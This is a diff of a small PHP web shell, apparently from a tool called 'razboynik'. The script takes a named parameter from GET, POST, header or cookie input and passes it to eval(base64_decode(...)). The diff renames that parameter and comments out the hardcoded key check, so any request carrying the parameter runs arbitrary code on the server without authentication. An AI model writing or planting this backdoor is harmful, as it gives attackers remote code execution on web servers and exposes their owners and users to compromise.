@@ -1,6 +1,6 @@
 <?php
 
-const PARAM = "fuzzer";
+const PARAM = "razboynik";
 const PARAM_KEY = "RAZBOYNIK_KEY";
 const RKEY = "FromRussiaWithLove<3";
 
@@ -13,11 +13,11 @@ $arr = [$g, $p, $h, $c];
 
 foreach ($arr as $i) {
 	if (isset($i[PARAM])) {
-		if ($h[PARAM_KEY] == RKEY) {
+		//if ($h[PARAM_KEY] == RKEY) {
 			eval(base64_decode($i[PARAM]));
-		}
+		//}
 
-		echo "Too bad";
+		//echo "Too bad";
 	}
 }
 
